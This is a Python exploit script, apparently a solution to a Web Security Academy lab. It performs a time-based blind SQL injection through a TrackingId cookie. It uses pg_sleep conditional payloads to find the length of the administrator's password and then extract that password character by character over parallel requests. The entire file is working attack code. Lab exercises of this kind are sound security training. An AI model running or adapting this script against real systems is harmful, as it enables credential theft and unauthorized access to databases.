import string
import time
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from http.cookiejar import CookieJar

URL = 'https://0a62004a03cfc9bc81033e0300350039.web-security-academy.net/'
PATH = 'filter?category=Gifts'
TID = "hboNezi42tY735cC"
CHARS = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
LIMITE = 2.7
ESPERA = 4
WORKERS = 5
TIMEOUT = 10


def sessao():
    cj = CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    urllib.request.install_opener(op)
    return op


def requisicao(op, url, cookies):
    req = urllib.request.Request(url)
    req.add_header('Cookie', '; '.join([f"{k}={v}" for k, v in cookies.items()]))
    try:
        t0 = time.time()
        resp = op.open(req, timeout=TIMEOUT)
        dt = time.time() - t0
        return resp.read().decode('utf-8'), dt
    except Exception as e:
        print(f"Erro: {e}")
        return "", 0


def demorou(dt):
    return dt >= (LIMITE - 0.15)


def montar_payload(cond):
    return f"||(SELECT CASE WHEN ({cond}) THEN pg_sleep({ESPERA}) ELSE pg_sleep(0) END)--"


def verificar(op):
    _, dt = requisicao(op, URL + PATH, {
        'TrackingId': f"{TID}' {montar_payload('1=1')}"
    })
    if demorou(dt):
        print("TrackingId valido!\n")
        return True
    return False


def descobrir_tamanho(op):
    ini, fim, tam = 1, 50, None
    while ini <= fim:
        meio = (ini + fim) // 2
        cond = f"(SELECT length(password) FROM users WHERE username = 'administrator') > {meio}"
        _, dt = requisicao(op, URL + PATH, {
            'TrackingId': f"{TID}' {montar_payload(cond)}"
        })
        if demorou(dt):
            print(f"Tamanho > {meio}")
            ini = meio + 1
        else:
            print(f"Tamanho <= {meio}")
            tam = meio
            fim = meio - 1
    print(f"Tamanho da senha: {tam}")
    return tam


def testar_char(op, pos, c):
    try:
        cond = f"SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {pos}, 1) = '{c}'"
        for _ in range(2):
            _, dt = requisicao(op, URL + PATH, {
                'TrackingId': f"{TID}' {montar_payload(cond)}"
            })
            if demorou(dt):
                return c, True
        return c, False
    except Exception as e:
        print(f"Erro: {e}")
        return c, False


def extrair_senha(op, tam):
    resultado = []
    while len(resultado) < tam:
        pos = len(resultado) + 1
        print(f"\nPosicao {pos}...")
        achou = None
        with ThreadPoolExecutor(max_workers=WORKERS) as ex:
            tarefas = {ex.submit(testar_char, op, pos, c): c for c in CHARS}
            for f in as_completed(tarefas):
                letra, ok = f.result()
                if ok:
                    print(f"+ {letra}", end=" ", flush=True)
                    achou = letra
                    [t.cancel() for t in tarefas]
                    break
                print(f"- {letra}", end=" ", flush=True)
        if achou:
            print(f"\nEncontrado: {achou} na posicao {pos}")
            resultado.append(achou)
            continue
        print(f"\nNenhum caractere encontrado na posicao {pos}")
        break
    senha = ''.join(resultado)
    print(f"\n\nSenha: {senha}")
    return senha


if __name__ == '__main__':
    op = sessao()
    if not verificar(op):
        print("TrackingId invalido, atualize antes de tentar novamente")
        exit()
    tam = descobrir_tamanho(op)
    extrair_senha(op, tam)